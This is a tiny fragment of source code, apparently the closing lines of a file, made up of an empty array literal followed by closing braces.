[];}
  }
}
